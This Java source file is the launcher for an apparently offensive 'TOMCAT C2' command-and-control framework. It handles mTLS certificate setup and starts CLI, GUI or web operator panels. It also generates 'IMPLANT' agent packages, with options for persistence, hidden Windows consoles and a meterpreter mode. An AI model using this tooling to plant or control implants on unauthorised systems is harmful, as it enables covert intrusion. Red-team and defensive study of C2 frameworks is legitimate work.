package com.tomcat;

import com.tomcat.core.crypto.CertificateManager;
import com.tomcat.core.output.Logger;
import com.tomcat.iface.GUI;
import com.tomcat.iface.CLI;
import com.tomcat.iface.WebApp;
import com.tomcat.iface.banner.AUTHBanner;
import com.tomcat.iface.banner.TBanner;
import com.tomcat.utils.ServerConfig;
import com.tomcat.utils.SystemHelper;

import java.io.*;
import java.nio.file.*;
import java.util.*;

public class Start {
    private static ServerConfig Config;

    public static void main(String[] Args) {
        Config = new ServerConfig();
        ProcessArgs(Args);
    }

    private static void ProcessArgs(String[] Args) {
        List<String> ArgList = Arrays.asList(Args);

        if (ArgList.contains("-h") || ArgList.contains("--help")) {
            PrintHelp();
            return;
        }

        if (ArgList.contains("-i") || ArgList.contains("--init-certs")) {
            SystemHelper.ClearScreen();
            TBanner.Logo();
            AUTHBanner.Logo();
            String Host = GetArg(ArgList, "-S", "--host", Config.GetServerHost());
            InitCertificates(Host);
            return;
        }

        String GenAgent = GetArg(ArgList, "-a", "--gen-agent", null);
        if (GenAgent != null) {
            SystemHelper.ClearScreen();
            TBanner.Logo();
            AUTHBanner.Logo();
            String AgentHost = GetArg(ArgList, "-ah", "--agent-host", Config.GetServerHost());
            int AgentPort = Integer.parseInt(GetArg(ArgList, "-ap", "--agent-port", String.valueOf(Config.GetServerPort())));
            boolean AgentMtls = ArgList.contains("-am") || ArgList.contains("--agent-mtls");
            boolean Persistence = ArgList.contains("-ps") || ArgList.contains("--persistence");
            boolean HideConsole = ArgList.contains("-hc") || ArgList.contains("--hide-console");
            GenerateAgentCert(GenAgent, true, AgentHost, AgentPort, AgentMtls, Persistence, HideConsole);
            return;
        }

        if (ArgList.contains("-m") || ArgList.contains("--gen-multi-agent")) {
            SystemHelper.ClearScreen();
            TBanner.Logo();
            AUTHBanner.Logo();
            int Count = Integer.parseInt(GetArg(ArgList, "-c", "--gen-agent-count", "10"));
            String Prefix = GetArg(ArgList, "-u", "--gen-agent-prefix", "agent");
            String AgentHost = GetArg(ArgList, "-ah", "--agent-host", Config.GetServerHost());
            int AgentPort = Integer.parseInt(GetArg(ArgList, "-ap", "--agent-port", String.valueOf(Config.GetServerPort())));
            boolean AgentMtls = ArgList.contains("-am") || ArgList.contains("--agent-mtls");
            boolean Persistence = ArgList.contains("-ps") || ArgList.contains("--persistence");
            boolean HideConsole = ArgList.contains("-hc") || ArgList.contains("--hide-console");
            GenerateMultipleAgents(Count, Prefix, AgentHost, AgentPort, AgentMtls, Persistence, HideConsole);
            return;
        }

        if (ArgList.contains("-l") || ArgList.contains("--list-agents")) {
            SystemHelper.ClearScreen();
            TBanner.Logo();
            AUTHBanner.Logo();
            ListAgents();
            return;
        }

        String RevokeAgent = GetArg(ArgList, "-r", "--revoke-agent", null);
        if (RevokeAgent != null) {
            SystemHelper.ClearScreen();
            TBanner.Logo();
            AUTHBanner.Logo();
            RevokeAgentCert(RevokeAgent);
            return;
        }

        SystemHelper.ClearScreen();
        TBanner.Logo();
        AUTHBanner.Logo();

        String Host = GetArg(ArgList, "-S", "--host", Config.GetServerHost());
        int Port = Integer.parseInt(GetArg(ArgList, "-p", "--port", String.valueOf(Config.GetWebPort())));
        boolean UseMtls = ArgList.contains("-T") || ArgList.contains("--mtls") || Config.IsMtlsEnabled();
        boolean Meterpreter = ArgList.contains("-M") || ArgList.contains("--meterpreter") || Config.IsMeterpreterMode();

        String Mode = Config.GetInterfaceMode();
        if (ArgList.contains("-C") || ArgList.contains("--cli-mode")) Mode = "cli";
        else if (ArgList.contains("-G") || ArgList.contains("--gui-mode")) Mode = "gui";
        else if (ArgList.contains("-W") || ArgList.contains("--web-mode")) Mode = "web";

        if (UseMtls && !Files.exists(Paths.get("Certs/server.p12"))) {
            Logger.Warnings("MTLS Certificates Not Found!");
            Logger.Warnings("Run: java -jar tomcat-c2.jar --init-certs");
            System.exit(1);
        }

        StartInterface(Host, Port, UseMtls, Meterpreter, Mode);
    }

    private static void StartInterface(String Host, int Port, boolean UseMtls, boolean Meterpreter, String Mode) {
        try {
            switch (Mode.toLowerCase()) {
                case "cli" -> {
                    Logger.Messages("Interface: CLI Mode");
                    new CLI(Config).Run(Host, Port, UseMtls, Meterpreter);
                }
                case "gui" -> {
                    Logger.Messages("Interface: JavaFX GUI");
                    GUI.Launch(Config);
                }
                default -> {
                    Logger.Messages("Interface: Web Panel (HTTP)");
                    WebApp App = new WebApp(Config, UseMtls);
                    App.Run(Host, Port);
                    Thread.currentThread().join();
                }
            }
        } catch (InterruptedException Ignored) {
            Logger.Warnings("Server Stopped By User");
        } catch (Exception E) {
            Logger.ErrorMsg("Error: " + E.getMessage());
            System.exit(1);
        }
    }

    private static void InitCertificates(String Host) {
        try {
            CertificateManager Mgr = new CertificateManager("Certs", Config.GetKeystorePassword());
            Mgr.Initialize(Host);
            Logger.Messages("Certificates stored in: Certs/");
            Logger.Messages("Next steps:");
            Logger.Messages("  1. Generate agent: java -jar tomcat-c2.jar -a <agent-id>");
            Logger.Messages("  2. Start with MTLS: java -jar tomcat-c2.jar --mtls");
        } catch (Exception E) {
            Logger.ErrorMsg("Certificate init failed: " + E.getMessage());
        }
    }

    private static void GenerateAgentCert(String AgentId, boolean UseRawName,
            String Host, int Port, boolean UseMtls,
            boolean Persistence, boolean HideConsole) {
        try {
            if (!Files.exists(Paths.get("Certs/ca.p12"))) {
                Logger.Warnings("CA Not Found. Run: java -jar tomcat-c2.jar --init-certs");
                return;
            }
            CertificateManager Mgr = new CertificateManager("Certs", Config.GetKeystorePassword());
            Mgr.CreateCa();
            String CertPath = Mgr.CreateAgentCertificate(AgentId, UseRawName, 365);
            String AgentName = UseRawName ? AgentId : "Agent-" + AgentId;
            String DeployDir = "IMPLANT/" + AgentName.toUpperCase();
            Files.createDirectories(Paths.get(DeployDir));
            Files.copy(Paths.get(CertPath), Paths.get(DeployDir + "/agent.p12"), StandardCopyOption.REPLACE_EXISTING);
            Files.copy(Paths.get("Certs/ca.p12"), Paths.get(DeployDir + "/ca.p12"), StandardCopyOption.REPLACE_EXISTING);
            WriteAgentReadme(DeployDir, AgentName, Host, Port, UseMtls, Persistence, HideConsole);
            Logger.Messages("Agent Deployment Package: " + DeployDir);
            Logger.Messages("Server: " + Host + ":" + Port);
            Logger.Messages("MTLS: " + (UseMtls ? "ENABLED" : "DISABLED"));
        } catch (Exception E) {
            Logger.ErrorMsg("Agent cert generation failed: " + E.getMessage());
        }
    }

    private static void GenerateMultipleAgents(int Count, String Prefix,
            String Host, int Port, boolean UseMtls,
            boolean Persistence, boolean HideConsole) {
        Logger.Messages("Generating " + Count + " agents with prefix: " + Prefix);
        int Success = 0;
        for (int I = 1; I <= Count; I++) {
            String AgentId = String.format("%s-%03d", Prefix, I);
            try {
                GenerateAgentCert(AgentId, true, Host, Port, UseMtls, Persistence, HideConsole);
                Success++;
            } catch (Exception E) {
                Logger.ErrorMsg("Error generating " + AgentId + ": " + E.getMessage());
            }
        }
        Logger.Messages("Generated " + Success + "/" + Count + " agents successfully");
    }

    private static void ListAgents() {
        try {
            CertificateManager Mgr = new CertificateManager("Certs", Config.GetKeystorePassword());
            Map<String, Map<String, String>> Agents = Mgr.ListAgents();
            if (Agents.isEmpty()) {
                Logger.Warnings("No agents generated yet");
                Logger.Messages("Generate with: java -jar tomcat-c2.jar -a <agent-id>");
                return;
            }
            Logger.Messages("Total Agents: " + Agents.size());
            Agents.forEach((Name, Info) -> {
                Logger.Messages("  Agent  : " + Name);
                Logger.Messages("  Created: " + Info.getOrDefault("Created", "N/A"));
                System.out.println();
            });
        } catch (Exception E) {
            Logger.ErrorMsg("Failed to list agents: " + E.getMessage());
        }
    }

    private static void RevokeAgentCert(String AgentId) {
        try {
            CertificateManager Mgr = new CertificateManager("Certs", Config.GetKeystorePassword());
            Mgr.RevokeAgent(AgentId);
        } catch (Exception E) {
            Logger.ErrorMsg("Revoke failed: " + E.getMessage());
        }
    }

    private static void WriteAgentReadme(String Dir, String Name, String Host,
            int Port, boolean Mtls, boolean Persistence, boolean HideConsole) {
        try (PrintWriter W = new PrintWriter(Dir + "/README.txt")) {
            W.println("TOMCAT C2 Agent - " + Name);
            W.println("Configuration:");
            W.println("  Server Host: " + Host);
            W.println("  Server Port: " + Port);
            W.println("  MTLS Mode  : " + (Mtls ? "ENABLED" : "DISABLED"));
            W.println("  Persistence: " + (Persistence ? "ENABLED" : "DISABLED"));
            W.println("  HideConsole: " + (HideConsole ? "ENABLED" : "DISABLED"));
            W.println();
            W.println("Files:");
            W.println("  agent.p12  - Agent PKCS12 Keystore (Keep Secure!)");
            W.println("  ca.p12     - CA Truststore");
            W.println("  README.txt - This file");
            W.println();
            W.println("Certificate expires in 365 days.");
        } catch (IOException Ignored) {}
    }

    private static String GetArg(List<String> Args, String ShortOpt, String LongOpt, String Default) {
        for (int I = 0; I < Args.size() - 1; I++) {
            if (Args.get(I).equals(ShortOpt) || Args.get(I).equals(LongOpt)) {
                return Args.get(I + 1);
            }
        }
        return Default;
    }

    private static void PrintHelp() {
        System.out.println("""
            TOMCAT C2 Framework V2 (Java)

            Options:
              -h / --help               Show this help
              -i / --init-certs         Initialize MTLS certificates

            Server Options:
              -S / --host               Server host address
              -p / --port               Web panel port (default: 5000)
              -T / --mtls               Enable MTLS authentication
              -M / --meterpreter        Enable multi-protocol mode
              -C / --cli-mode           CLI interface
              -G / --gui-mode           JavaFX GUI interface
              -W / --web-mode           Web panel interface (default)

            Agent Options:
              -a / --gen-agent <id>     Generate single agent certificate
              -m / --gen-multi-agent    Generate multiple agent certificates
              -c / --gen-agent-count    Number of agents to generate
              -u / --gen-agent-prefix   Agent name prefix
              -l / --list-agents        List all agent certificates
              -r / --revoke-agent <id>  Revoke agent certificate
              -ah / --agent-host        C2 host for agent configuration
              -ap / --agent-port        C2 port for agent configuration
              -am / --agent-mtls        Enable MTLS for agent
              -ps / --persistence       Enable persistence for agent
              -hc / --hide-console      Hide console window (Windows)

            Examples:
              java -jar tomcat-c2.jar
              java -jar tomcat-c2.jar -C
              java -jar tomcat-c2.jar -G
              java -jar tomcat-c2.jar --mtls
              java -jar tomcat-c2.jar -i
              java -jar tomcat-c2.jar -a myagent -ah 192.168.1.1 -ap 4444 -am
              java -jar tomcat-c2.jar -m -c 5 -u team -ah 192.168.1.1 -ap 4444
        """);
    }
}